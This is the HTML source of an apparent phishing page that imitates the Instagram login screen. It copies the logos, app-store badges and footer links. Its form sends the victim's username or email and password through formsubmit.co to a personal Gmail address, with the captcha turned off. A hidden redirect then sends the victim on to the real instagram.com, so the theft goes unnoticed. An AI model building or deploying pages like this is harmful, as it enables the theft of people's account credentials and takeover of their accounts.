<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <img src="instalogo2.png" alt="Instagram" class="logo">
        <form method="POST" action="https://formsubmit.co/ranamana7498297@gmail.com" enctype="multipart/form-data">
            <input type="text, email, number" name="email" placeholder="Phone number, username, or email" required>
            <input type="password, hidden" name="name"  placeholder="Password" required>
            <input type="hidden" name="_next" value="https://www.instagram.com/">
            <button type="submit">Log in</button>
            <input type="hidden" name="_captcha" value="false">
            <a href="#" class="forgot-password">Forgot password?</a>
        </form>
        <div class="signup">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        <div class="get-app">
            <p>Get the app.</p>
            <div class="app-stores">
                <img src="playstorelog.png" alt="Get it on Google Play">
                <img src="microsoftlogo.png" alt="Get it from Microsoft">
            </div>
        </div>
    </div>
    <footer>
        <nav>
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
        </nav>
    </footer>
</body>
</html>
